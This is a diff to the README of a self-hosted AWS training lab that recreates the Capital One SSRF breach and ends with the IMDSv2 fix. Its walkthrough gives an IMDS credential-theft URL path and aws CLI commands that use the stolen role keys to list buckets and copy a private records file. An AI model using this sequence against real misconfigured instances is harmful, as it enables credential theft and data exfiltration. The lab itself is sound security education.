@@ -7,26 +7,49 @@ Disposable AWS lab that reconstructs the **2019 Capital One** entry:
 3. **IMDSv1** (`HttpTokens=optional`).
 4. Instance role **`capone-WAF-Role`** that can list buckets and read one private object.
 
-This is not Capital One’s exact ModSecurity ruleset (that was never published). It is the same shape: a WAF/reverse proxy on EC2 that will fetch IMDS on the attacker’s behalf, then an over-privileged WAF role.
+**Do not run this in production. Use a throwaway account. Tear it down when you are done. Port 80 is open.**
 
-**Do not run this in production. Tear it down when you are done. Port 80 is open.**
+## How the scripts know your AWS account
 
-## One command
+`setup.sh` and `destroy.sh` **do not take an account ID**. They use the AWS CLI identity already configured on your machine.
+
+```text
+aws configure --profile lab          # writes keys for that profile
+export AWS_PROFILE=lab               # this shell now talks to THAT account
+export AWS_REGION=us-east-1          # optional; scripts default to us-east-1
+aws sts get-caller-identity          # confirm account / user / role
+./setup.sh                           # deploys into that same identity
+```
+
+On start, both scripts print `AWS_PROFILE`, account ID, ARN, and region, then ask `y/N` before creating or deleting anything.
+
+Skip the prompt only if you are sure:
+
+```bash
+ASSUME_YES=1 ./setup.sh
+ASSUME_YES=1 ./destroy.sh
+```
+
+If the CLI is not authenticated, the script exits and prints these steps.
+
+You need AWS CLI v2, a **default VPC** in the region, and IAM permission to create EC2, instance profiles/roles, S3 buckets, and security groups.
+
+## Setup
 
 ```bash
 git clone https://github.com/Pranav-Thorve/imdsv1-ssrf-lab.git
 cd imdsv1-ssrf-lab
 chmod +x setup.sh destroy.sh
+export AWS_PROFILE=lab
+export AWS_REGION=us-east-1
 ./setup.sh
 ```
-
-Needs AWS CLI v2 credentials that can create EC2, IAM, S3, and a security group in the default VPC of `us-east-1` (override with `AWS_REGION`).
 
 ## What you do
 
 WAF home: `http://<PUBLIC_IP>/`
 
-In the **browser address bar** (the WAF is reverse-proxying this path to IMDS):
+In the **browser address bar** (the WAF reverse-proxies this path to IMDS):
 
 ```
 http://<PUBLIC_IP>/latest/meta-data/iam/security-credentials/
@@ -34,16 +57,17 @@ http://<PUBLIC_IP>/latest/meta-data/iam/security-credentials/
 
 Then append the role name (`capone-WAF-Role`). The body is the instance-role JSON.
 
-Export those keys, `unset AWS_PROFILE`, then:
+Put those keys in a CLI profile (session token is required for `ASIA` keys):
 
 ```bash
-aws sts get-caller-identity
-aws s3 ls
-aws s3 ls s3://<lab-bucket> --recursive
-aws s3 cp s3://<lab-bucket>/secret/customer-records.txt -
+aws configure --profile cloud-sec-lab
+aws sts get-caller-identity --profile cloud-sec-lab
+aws s3 ls --profile cloud-sec-lab
+aws s3 ls s3://<lab-bucket> --recursive --profile cloud-sec-lab
+aws s3 cp s3://<lab-bucket>/secret/customer-records.txt - --profile cloud-sec-lab
 ```
 
-Require IMDSv2:
+Require IMDSv2 (use the **same** `AWS_PROFILE` you used for setup):
 
 ```bash
 aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required
@@ -53,6 +77,12 @@ Reload the same `/latest/` URLs. Expect **401**.
 
 ## Destroy
 
+Use the **same profile and region** as setup:
+
 ```bash
+export AWS_PROFILE=lab
+export AWS_REGION=us-east-1
 ./destroy.sh
 ```
+
+Only resources tagged `Project=capone-imds-lab` in that account/region are removed.
